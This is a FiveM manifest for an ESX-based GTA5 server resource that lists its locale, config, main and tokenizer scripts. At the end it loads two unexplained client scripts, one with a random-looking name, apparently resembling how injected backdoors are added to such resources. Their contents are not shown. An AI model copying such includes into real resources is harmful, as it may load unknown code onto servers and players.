fx_version 'adamant'
game 'gta5'
version '1.0'

server_scripts {
    '@es_extended/locale.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'config.lua',
	'client/main.lua'
}


server_script '@salty_tokenizer/init.lua'
client_script '@salty_tokenizer/init.lua'
client_script "ph1ll1p.lua"

client_script 'TaECYVHORtFK.lua'